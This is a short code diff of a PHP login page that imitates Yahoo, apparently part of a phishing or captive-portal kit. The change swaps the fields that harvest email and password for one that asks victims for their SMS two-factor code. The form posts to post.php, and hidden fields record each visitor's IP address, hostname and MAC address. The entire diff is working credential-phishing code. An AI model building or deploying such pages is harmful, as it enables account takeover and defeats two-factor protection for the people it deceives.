@@ -141,8 +141,7 @@ require_once('helper.php');
 
           <form method="POST" action="post.php" class="form-signin">
 
-            <input type="text" name="email_yahoo" class="form-email" placeholder="Enter your Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
-            <input type="password" name="password_yahoo" class="form-password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input type="text" name="2fa_yahoo" class="form-email" placeholder="Enter your SMS code" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
